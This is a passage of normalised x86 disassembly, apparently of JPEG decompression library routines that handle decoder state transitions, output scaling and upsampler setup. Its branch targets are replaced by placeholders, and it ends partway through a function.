mov eax [ edx ]
mov [ eax + 0x14 ] 0x72
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x109 ]
mov [ edx + 0x18 ] ecx
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x28 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] 0x2
jmp r-xdata
sub_419a70
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xcd
je r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x40 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0xce
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0xcf
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x78 ]
cmp eax [ edx + 0x60 ]
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xd2
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0xd2
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x180 ]
call [ edx + 0x4 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0xd2
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x43
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
xor eax eax
mov al [ edx + 0x11 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
call [ eax + 0x18 ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_420b30
add esp 0x4
mov al 0x1
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x190 ]
call [ eax ]
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419b90
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xca
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xcb
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_41a380
add esp 0x4
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x40 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0xcc
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
xor eax eax
mov al [ edx + 0x10 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0xcb
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0xcf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_419d00
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x14
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x7c ]
mov [ edx + 0x84 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
call [ ecx ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
call [ ecx ]
add esp 0x4
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0x4 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x8 ]
jl r-xdata
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x11c ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov [ ecx + 0x8 ] eax
sub_419d00
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xcc
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x180 ]
call [ eax ]
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x78 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0xcc
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x41 ]
neg ecx
sbb ecx ecx
neg ecx
add ecx 0xcd
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov al 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x78 ]
cmp edx [ ecx + 0x60 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
call [ ecx + 0x4 ]
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + 0x78 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
mov [ ebp - 0x4 ] ecx
push 0x0
mov edx [ ebp + 0x8 ]
add edx 0x78
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x184 ]
call [ edx + 0x4 ]
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
cmp ecx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x60 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
call [ edx ]
add esp 0x4
jmp r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e30
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xcd
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x78 ]
cmp eax [ edx + 0x60 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x7b
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x184 ]
call [ edx + 0x4 ]
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
add ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x78 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x78 ]
mov [ edx + 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x60 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
call [ edx ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419f20
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0xca
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
shl edx 0x3
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x34 ]
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov [ ecx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
call [ eax ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
shl ecx 0x2
mov edx [ ebp + 0x8 ]
cmp ecx [ edx + 0x34 ]
ja r-xdata
push 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x5c ] eax
push 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x118 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x30 ]
shl edx 0x1
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x34 ]
ja r-xdata
push 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
push ecx
call sub_420c70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x5c ] eax
push 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
push ecx
call sub_420c70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x118 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ eax + 0x5c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x118 ] 0x8
push 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x5c ] eax
push 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x118 ] 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x118 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ecx + 0x24 ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x8 ]
imul ecx [ ebp - 0xc ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x110 ]
imul edx [ eax + 0x118 ]
cmp ecx edx
jg r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x2c ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx 0x1
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x10 ] 0x4
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x110 ]
shl ecx 0x3
push ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x8 ]
imul ecx [ eax + 0x24 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
imul eax ecx
push eax
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x28 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
shl eax 0x3
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
imul edx eax
push edx
call sub_420c70
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x2c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x54
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0xc ]
imul ecx [ ebp - 0xc ]
shl ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x114 ]
imul edx [ eax + 0x118 ]
cmp ecx edx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x10 ]
jmp [ edx * 4 + jump_table_41a25b ]
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x54
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
shl eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x64 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] 0x3
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] 0x4
jmp r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x6c ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x114 ]
mov [ ecx + 0x6c ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x68 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41a270
add esp 0x4
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x4a ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a270
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x48 ]
test ecx ecx
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x10a ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x28 ] 0x3
jne r-xdata
xor al al
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x2c ] 0x2
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x64 ] 0x3
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
cmp [ eax + 0x8 ] 0x2
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
cmp [ edx + 0x5c ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
cmp [ ecx + 0xb0 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
cmp [ eax + 0xc ] 0x2
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
cmp [ edx + 0x60 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
cmp [ ecx + 0xb4 ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x24 ]
cmp edx [ ecx + 0x118 ]
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x78 ]
cmp eax [ edx + 0x118 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0xcc ]
cmp ecx [ eax + 0x118 ]
je r-xdata
mov al 0x1
sub_41a380
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push 0x1c
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x180 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_41a870
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_41aaa0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_41a3e0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3e0
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x180 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_419f20
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_41a780
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x5c ]
imul eax [ edx + 0x64 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp - 0xc ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_41a270
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x4a ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x46
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x59 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x5a ] 0x0
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x40 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x41 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x41 ]
test edx edx
je r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x4a ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4250d0
add esp 0x4
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xc9 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
xor eax eax
mov al [ edx + 0x10 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x2f
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xc8 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx ]
add esp 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_426460
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_425980
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_426d20
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x74 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58 ] 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x59 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x5a ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x74 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4234a0
add esp 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_423e20
add esp 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
xor eax eax
mov al [ edx + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + 0x5a ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_425490
add esp 0x8
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x50 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x59 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x58 ]
test edx edx
je r-xdata
mov [ ebp - 0x18 ] 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x40 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x58 ] 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x5a ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x5a ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_429280
add esp 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1a8 ]
mov [ ecx + 0x14 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x18 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
call [ edx + 0x8 ]
add esp 0x4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_420da0
add esp 0x8
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_427640
add esp 0x4
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1a8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x59 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dl [ ecx + 0x40 ]
test edx edx
jne r-xdata
mov al [ ebp - 0x18 ]
mov [ ebp - 0x8 ] al
mov cl [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_421770
add esp 0x8
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x41 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
xor edx edx
mov dl [ ecx + 0x10 ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0xc8 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x24 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
imul eax eax 0x3
add eax 0x2
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x11c ]
imul eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0x5a ]
neg eax
sbb eax eax
neg eax
add eax 0x2
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
sub_41a780
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x580
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x100
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x120 ] edx
push 0x100
push 0x0
